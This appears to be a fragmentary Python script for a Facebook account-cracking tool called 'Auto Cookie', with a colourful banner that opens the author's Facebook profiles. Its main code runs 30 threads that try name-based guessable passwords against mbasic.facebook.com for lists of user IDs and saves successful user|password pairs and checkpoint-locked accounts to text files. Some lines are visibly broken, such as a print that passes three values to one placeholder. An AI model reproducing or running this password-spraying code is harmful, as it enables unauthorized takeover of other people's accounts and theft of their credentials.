...
from concurrent.futures import ThreadPoolExecutor as sarfrazJITU
...
print(f""" 
 ...
 \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mJIBON AHMED JITU     \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m JIBON AHMED           \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mFUCKER                \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Auto Cookie           \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mNAI                   \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.0                   \033[1;93m|
 \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m  SHALI ACHE BHAI..?😒🤓
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m STAY WITH US....
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××
   \033[1;91m<===>\033[1;41m\033[1;97m Auto Cookie Tools Creact By JIBON\033[;0m\033[1;91m<===>\033[1;92m""")
print(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××')
print('       \033[38;5;195mREQUEST SENT MY FRIST FACEBOOK ACCOUNT')
print(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××')
x = input('                  \033[38;5;46m Type Entar')
os.system('xdg-open https://www.facebook.com/JIBON.AHMED2007?mibextid=ZbWKwL')
time.sleep(0.7)
print(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××')
print ('         \033[38;5;195mREQUEST SENT MY SECOND FACEBOOK ACCOUNT')
print(' \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××')
x = input('                  \033[38;5;46m Type Entar')
time.sleep(0.5)
os.system('xdg-open https://www.facebook.com/JIBON.AHMED65?mibextid=ZbWKwL')
print(' \033[38;5;45m×××××××××××××××××××××××××××××××××××××××××××××××××')

print('       \033[38;5;195mREQUEST SENT MY THIRD FACEBOOK ACCOUNT')
x = input('                  \033[38;5;46m Type Entar')
time.sleep(0.3)
os.system('xdg-open https://www.facebook.com/PERMANENT009')
print(' \033[38;5;45m×××××××××××××××××××××××××××××××××××××××××××××××××')
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mJITU_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mJITU_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back JITU Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[JITU] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [JITU-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('JITU_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [JITU-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('JITU_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with sarfrazJITU(max_workers=30) as JITUworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        JITUworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
